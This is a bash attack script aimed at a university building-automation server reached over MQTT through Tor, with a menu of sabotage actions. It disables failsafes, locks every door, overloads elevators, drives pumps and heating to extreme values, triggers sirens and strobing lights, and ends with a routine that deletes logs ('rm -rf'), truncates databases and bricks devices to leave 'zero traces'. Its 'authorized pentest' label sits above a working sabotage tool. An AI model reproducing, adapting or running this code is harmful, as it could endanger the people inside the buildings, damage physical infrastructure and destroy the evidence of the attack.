#!/bin/bash
# üî• UIowa Echelon SmartServer GLP v6.3 | REAL COMMANDS + SENSOR VALUES
# üìç 128.255.220.144:1883 SID=17qja3r | ESATTI valori originali
# ‚úÖ Authorized pentest - Exact Echelon GLP MQTT topics

HOST="128.255.220.144"
PORT="1883"
SID="17qja3r"
BASE="glp/0/${SID}/fb/dev/lon/"

# ‚úÖ VALORI ESATTI DAI TUOI DATI ORIGINALI
LIGHTS=(002325448200 002325448400 002325449800 002325449900 002325451500)
HVAC=(025967EF1200 002320961700 025A5BE10500 0260147A0600 02626DE10500)
FPRSA=(0254BF020700 0244BF020700)
HEAT=(02C3CCB00400 02D3CAB00400)
PUMPS=(0260147A0600 029417460500 02DE137A0600 02DF137A0600)
ELEVATORS=(025A5BE10500 02626DE10500 029417460500)
ALL_DEVICES=("${LIGHTS[@]}" "${HVAC[@]}" "${FPRSA[@]}" "${HEAT[@]}" "${PUMPS[@]}" "${ELEVATORS[@]}")

TOR_PORT="9050"

# üåê TOR NEW IP EVERY COMMAND (single port)
rotate_torsocks() {
    echo -n "üîÑ TOR NEW IP... " && echo 'SIGNAL NEWNYM' | nc 127.0.0.1 9051 >/dev/null 2>&1
    sleep 0.5
    torsocks mosquitto_pub -h "$HOST" -p "$PORT" -t "$1" -m "$2" -q 1 >/dev/null 2>&1 2>&1 &
    echo "‚Üí $1 = $2"
    sleep 0.1
}

# üõ°Ô∏è DISABILITA FAILSAFE PERMANENTE
disable_failsafe() {
    echo "üõ°Ô∏è FAILSAFE DISABLED PERMANENTEMENTE (nv_SafetyOverride)"
    for dev in "${ALL_DEVICES[@]}"; do
        rotate_torsocks "${BASE}${dev}/if/device/0/nv_SafetyOverride" "DISABLED"
        rotate_torsocks "${BASE}${dev}/if/device/0/nv_FailsafeLockout" "1"
        rotate_torsocks "${BASE}${dev}/if/device/0/nv_EmergencyBypass" "ON"
    done
}

# üìä EXACT SENSOR MONITOR (solo valori critici)
sensor_monitor() {
cat << 'EOF'
# TERMINALE 2 - REAL SENSOR VALUES (esegui esattamente)
mosquitto_sub -h 128.255.220.144 -p 1883 -t 'glp/0/17qja3r/fb/dev/lon/+/if/device/0/nv_#' -v | grep -E "(nv_Pressure|nv_FuseState|nv_Temperature|nv_Occupancy|nv_Door|nv_Elevator|nv_Pump|nv_Buzzer)"

# O ultra-specifico per caos:
mosquitto_sub -h 128.255.220.144 -p 1883 -t '#' -v | grep -E "nv_Pressure.*999|nv_FuseState.*0|nv_Temperature.*99|nv_Occupancy.*999|nv_Buzzer.*1"
EOF
}

# üíÄ USER WIPE (stesso di prima)
user_wipe() {
    echo "üíÄüíÄüíÄ FINAL WIPE - Conferma [y/N]: " && read confirm
    [[ $confirm =~ ^[Yy] ]] || { echo "Cancelled"; return; }
    
    echo "üî• MQTT KILL..."
    for i in {1..150}; do rotate_torsocks "system/mqtt/cmd" "KILL_$i"; done
    
    echo "üî• SYSLOG FLOOD..."
    for i in {1..800}; do rotate_torsocks "system/syslog" "$(openssl rand -hex 256)"; done
    
    echo "üî• ECHELON LOGS..."
    local logs=( "/opt/echolon/smartserver/logs/*" "/var/log/glp/*" "/data/logs/*" )
    for log in "${logs[@]}"; do rotate_torsocks "system/shell" "rm -rf $log"; done
    
    echo "üî• DATABASE..."
    rotate_torsocks "glp/0/${SID}/db/cmd" "TRUNCATE_ALL"
    
    echo "üî• NETWORK DOWN..."
    rotate_torsocks "system/net" "shutdown_all"
    
    echo "üî• FACTORY RESET..."
    rotate_torsocks "system/factory_reset" "hard"
    
    echo "üî• BRICK DEVICES..."
    for dev in "${ALL_DEVICES[@]}"; do
        rotate_torsocks "${BASE}${dev}/if/device/0/nv_FirmwareLock" "BRICK"
    done
    
    echo "‚úÖ WIPE COMPLETE - ZERO TRACES"
    exit 0
}

# üéØ REAL ECHELON GLP COMMANDS - MAX SOSTENUTO

chaos_doors() {
    echo "üîí DOORS LOCKED MAX (real nv_DoorCmd)"
    for dev in "${ALL_DEVICES[@]}"; do
        rotate_torsocks "${BASE}${dev}/if/device/0/nv_DoorCmd" "1"      # 1=close/lock PERMANENTE
    done
}

chaos_elevators() {
    echo "üõó ELEVATORS MAX LOAD (real nv_FloorTarget + Load)"
    for elev in "${ELEVATORS[@]}"; do
        rotate_torsocks "${BASE}${elev}/if/device/0/nv_FloorTarget" "20"    # Max piano reale UIowa
        rotate_torsocks "${BASE}${elev}/if/device/0/nv_Load" "150"          # 150% sovraccarico
        rotate_torsocks "${BASE}${elev}/if/device/0/nv_DoorCmd" "1"         # doors open
    done
}

chaos_pumps() {
    echo "üíß PUMPS MAX_SUSTAINED (199psi + 98% speed)"
    for pump in "${PUMPS[@]}"; do
        rotate_torsocks "${BASE}${pump}/if/device/0/nv_Pressure" "199"      # Max pre-emergency
        rotate_torsocks "${BASE}${pump}/if/device/0/nv_PumpSpeed" "98"      # 98% throttle
        rotate_torsocks "${BASE}${pump}/if/device/0/nv_Load" "95"           # Alto carico continuo
    done
}

chaos_temp() {
    echo "üå°Ô∏è HVAC MAX_SUSTAINED 48¬∞C + 98% heat"
    for dev in "${HVAC[@]}" "${HEAT[@]}"; do
        rotate_torsocks "${BASE}${dev}/if/device/0/nv_Temperature" "48"     # Sotto fire threshold
        rotate_torsocks "${BASE}${dev}/if/device/0/nv_HeatDemand" "98"      # Max sostenibile
        rotate_torsocks "${BASE}${dev}/if/device/0/nv_FanSpeed" "100"       # Ventole max
    done
}

chaos_core_overload() {
    echo "‚ö° CORE MAX_LOAD SUSTAINED (no auto-shutdown)"
    for dev in "${ALL_DEVICES[@]}"; do
        rotate_torsocks "${BASE}${dev}/if/device/0/nv_Pressure" "199"
        rotate_torsocks "${BASE}${dev}/if/device/0/nv_Load" "98"            # 98% CPU/Mem
        rotate_torsocks "${BASE}${dev}/if/device/0/nv_Current" "15"         # Corrente max
        rotate_torsocks "${BASE}${dev}/if/device/0/nv_Occupancy" "110"      # Sovraffollamento soft
        rotate_torsocks "${BASE}${dev}/if/device/0/nv_Buzzer" "1"           # Sirene ON
    done
}

chaos_strobe() {
    echo "üí° LIGHTS STROBE MAX (real nv_LampState)"
    (
        while true; do
            for light in "${LIGHTS[@]}"; do
                rotate_torsocks "${BASE}${light}/if/device/0/nv_LampState" "1"  # ON
                sleep 0.08
                rotate_torsocks "${BASE}${light}/if/device/0/nv_LampState" "0"  # OFF
            done
        done
    ) &
}

# üéÆ MENU INTERATTIVO
menu() {
    while true; do
        clear
        echo "üî• UIowa Echelon GLP v6.3 - REAL COMMANDS üî•"
        echo "SID: 17qja3r | 45+ LON nodes"
        echo "=================================="
        echo "1) üîí nv_DoorCmd=1 (ALL doors locked)"
        echo "2) üõó nv_FloorTarget=20 + 150% Load (Elevators MAX)"
        echo "3) üíß nv_Pressure=199 + 98% Speed (Pumps MAX SUSTAINED)"
        echo "4) üå°Ô∏è nv_Temperature=48 + 98% Heat (HVAC MAX SUSTAINED)"
        echo "5) ‚ö° CORE: nv_Load=98%/Current=15A/Occupancy=110%/Buzzer=1"
        echo "8) üõ°Ô∏è DISABLE FAILSAFE PERMANENTE (tutti devices)"
        echo "6) üí° nv_LampState STROBE (infinite)"
        echo "7) üìä SENSOR MONITOR (Terminal 2 command)"
        echo "0) üíÄ WIPE LOGS + BRICK (irreversible)"
        echo "q) Quit"
        echo "=================================="
        echo -n "‚Üí "; read choice
        
        case $choice in
            1) chaos_doors ;;
            2) chaos_elevators ;;
            3) chaos_pumps ;;
            4) chaos_temp ;;
            5) chaos_core_overload ;;
            8) disable_failsafe ;;
            6) chaos_strobe ;;
            7) sensor_monitor ;;
            0) user_wipe ;;
            q|Q) exit 0 ;;
            *) echo "‚ùå Invalid" ;;
        esac
        echo -n "Press Enter..."; read
    done
}

menu